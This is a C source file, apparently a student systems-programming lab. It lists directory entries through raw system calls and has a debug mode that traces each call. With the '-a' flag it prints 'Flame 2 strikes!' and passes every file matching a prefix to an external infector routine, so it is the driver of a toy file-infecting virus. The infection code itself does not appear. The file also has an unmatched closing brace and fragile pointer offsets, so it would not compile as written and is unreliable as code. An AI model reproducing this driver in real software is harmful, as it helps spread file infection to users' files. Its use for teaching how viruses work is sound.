#include "util.h"
#include <dirent.h>




#define EXIT 1
#define GETDENTS 141
#define STDERR 2
#define SYS_WRITE 4
#define STDOUT 1
#define STDERR 2
#define SYS_OPEN 5
#define O_RDONLY 0
#define DT_UNKNOWN 0
# define DT_FIFO 1
# define DT_CHR 2
# define DT_DIR 4
# define DT_BLK 6
# define DT_REG 8
# define DT_LNK 10
# define DT_SOCK 12


extern int system_call(int,...);
extern void infaction();
extern void infector(char*);
extern void code_start;
extern void code_end;
void printMode(int modeA ,int modeP, char *prefix){

    int file;
    int getdents;  
    char buffer[8191];  
    struct dirent *directory; 
    int k;  
    char type;  
    if(modeA){
        infaction();
        system_call(SYS_WRITE,STDOUT,"\n",1);
    }

    file=system_call(SYS_OPEN,".",O_RDONLY,0644);
    if (file < 0)
    {
        system_call(EXIT,0x55,"\n",1);     }

    for ( ; ; ) {
        getdents = system_call(GETDENTS, file, buffer, 8191);
        if (getdents < 0){
            system_call(EXIT,0x55,"\n",1);
        }
        if (getdents == 0)
            break;
        for (k = 0; k < getdents;) 
        {

            directory= (struct dirent *) (buffer + k);
            type = *(buffer + k + (directory->d_reclen)-1);
            if(modeP)
            {
                if(strncmp(prefix, (directory->d_name)-1, strlen(prefix)) == 0 )
                {
                        system_call(SYS_WRITE,STDOUT,(directory->d_name)-1,strlen(directory->d_name)+1);
                        system_call(SYS_WRITE,STDERR,"\ntype: ",7);
                            if(type==DT_UNKNOWN)
                                system_call(SYS_WRITE,STDERR,"unknown\n",8);
                            else if(type==DT_BLK)
                                system_call(SYS_WRITE,STDERR,"block\n",6);
                            else if(type==DT_REG)
                                system_call(SYS_WRITE,STDERR,"regular file\n",13);
                            else if(type==DT_DIR)
                                system_call(SYS_WRITE,STDERR,"directory\n",10);
                            else if(type==DT_FIFO)
                                system_call(SYS_WRITE,STDERR,"FIFO\n",5);

                            else if(type==DT_SOCK)
                                system_call(SYS_WRITE,STDERR,"socket\n",7);

                            if(modeA){
                            system_call(SYS_WRITE,STDERR,"\n\nCalling to infector..\n",24);
                            system_call(SYS_WRITE,STDOUT,"\n\n",2);
                            infector((directory->d_name)-1);
                            system_call(SYS_WRITE,STDOUT,"\n\n",2);
                        }

                system_call(SYS_WRITE,STDOUT," ",1);
            }
            k += directory->d_reclen;
        }
        else{

         system_call(SYS_WRITE,STDOUT,(directory->d_name)-1,strlen(directory->d_name)+1);
            system_call(SYS_WRITE,STDERR,"\ntype: ",7);
                    if(type==DT_UNKNOWN)
                        system_call(SYS_WRITE,STDERR,"unknown\n",8);
                    else if(type==DT_BLK)
                        system_call(SYS_WRITE,STDERR,"block\n",6);
                    else if(type==DT_REG)
                        system_call(SYS_WRITE,STDERR,"regular file\n",13);
                    else if(type==DT_DIR)
                        system_call(SYS_WRITE,STDERR,"directory\n",10);
                    else if(type==DT_FIFO)
                        system_call(SYS_WRITE,STDERR,"FIFO\n",5);

                    else if(type==DT_SOCK)
                        system_call(SYS_WRITE,STDERR,"socket\n",7);

                    else if(type==DT_CHR)
                        system_call(SYS_WRITE,STDERR,"char device\n",13);

                    else if(type==DT_LNK)
                        system_call(SYS_WRITE,STDERR,"symbolic link\n",14);

            system_call(SYS_WRITE,STDOUT," ",1);
            
            k += directory->d_reclen;
        }
        
    }
}

}
void DebugMode(int modeP, char *prefix){
    int result;
    int file, getdents;
    char buffer[8191];  
    struct dirent *directory; 
    int k;   
    char type;
    file=system_call(SYS_OPEN,".",O_RDONLY,0777);
    system_call(SYS_WRITE, STDERR, "\nSystem call ID: ", 16);
    system_call(SYS_WRITE,STDERR,itoa(SYS_WRITE),1);
    system_call(SYS_WRITE, STDERR, "\nReturn Code: ", 15);
    system_call(SYS_WRITE,STDERR,itoa(file),1);

    if (file < 0)  
    {
        system_call(EXIT,0x55,"\n",1);
    }

    for ( ; ; ) {
        getdents = system_call(GETDENTS, file, buffer, 8191);
        system_call(SYS_WRITE, STDERR, "\nSystem call ID: ", 17);
        system_call(SYS_WRITE,STDERR,itoa(GETDENTS),3);
        system_call(SYS_WRITE, STDERR, "\nReturn Code: ", 15);
        system_call(SYS_WRITE,STDERR,itoa(getdents),1);
        system_call(SYS_WRITE,STDERR,"\n",1);


        if (getdents <0){

            system_call(EXIT,0x55,"\n",1);
        }
        if (getdents == 0)
            break;

        for (k = 0; k < getdents;) {
            directory = (struct dirent *) (buffer + k);
             if(strncmp(prefix, (directory->d_name)-1, strlen(prefix)) == 0 )
            {
            type = *(buffer + k + (directory->d_reclen)-1);
            system_call(SYS_WRITE,STDERR,"\n",1);
            result=system_call(SYS_WRITE,STDERR,(directory->d_name)-1,strlen(directory->d_name)+1);
            system_call(SYS_WRITE,STDERR,": length: ",10);
            system_call(SYS_WRITE,STDERR,(itoa(directory->d_reclen))-1,strlen(itoa(directory->d_reclen))+1);
            system_call(SYS_WRITE,STDERR,": file serial number: ",22);
            system_call(SYS_WRITE,STDERR,(itoa(directory->d_ino))-1,strlen(itoa(directory->d_ino))+1);
            
            system_call(SYS_WRITE,STDERR,"\ntype: ",7);
                    if(type==DT_UNKNOWN)
                        system_call(SYS_WRITE,STDERR,"unknown\n",8);
                    else if(type==DT_BLK)
                        system_call(SYS_WRITE,STDERR,"block\n",6);
                    else if(type==DT_REG)
                        system_call(SYS_WRITE,STDERR,"regular file\n",13);
                    else if(type==DT_DIR)
                        system_call(SYS_WRITE,STDERR,"directory\n",10);
                    else if(type==DT_FIFO)
                        system_call(SYS_WRITE,STDERR,"FIFO\n",5);

                    else if(type==DT_SOCK)
                        system_call(SYS_WRITE,STDERR,"socket\n",7);

                    else if(type==DT_CHR)
                        system_call(SYS_WRITE,STDERR,"char device\n",13);

                    else if(type==DT_LNK)
                        system_call(SYS_WRITE,STDERR,"symbolic link\n",14);


                    system_call(SYS_WRITE,STDERR,"\n",1);


            k += directory->d_reclen;
            system_call(SYS_WRITE, STDERR, "\nSystem call ID: ", 17);
            system_call(SYS_WRITE,STDERR,itoa(SYS_WRITE),1);
            system_call(SYS_WRITE, STDERR, "\nReturn Code: ", 15);
            system_call(SYS_WRITE,STDERR,itoa(result)-1,2);
            system_call(SYS_WRITE,STDERR,"\n",1);
            }
            else{ k += directory->d_reclen;}


        }
    }

}
int main (int argc , char* argv[], char* envp[])
{
    
    int modeP = 0;
    int modeA = 0;
    char *prefix;
  

    int i;
    int mode=0;
    char *a = "\nFlame 2 strikes!\n";

    for (i = 0; i < argc; i++) {
        if (strcmp(argv[i], "-D") == 0) {
            system_call(SYS_WRITE,STDOUT,"-D\n",3);
            mode = 1;
        }
        else if(strncmp(argv[i], "-p",2) == 0)
        {
            system_call(SYS_WRITE,STDOUT,"-P\n",3);
            modeP = 1;
            prefix = argv[i]+2;
        }
        else if(strncmp(argv[i], "-a",2) == 0)
        {
            system_call(SYS_WRITE,STDOUT,"-A\n",3);
            modeA=1;
            modeP=1;
            prefix = argv[i]+2;
        }
    }
    system_call(4, 1, a,18);

    if(mode==0){
        printMode(modeA, modeP, prefix);
    }
    else{
        DebugMode(modeP, prefix);
    }

    return 0;
}



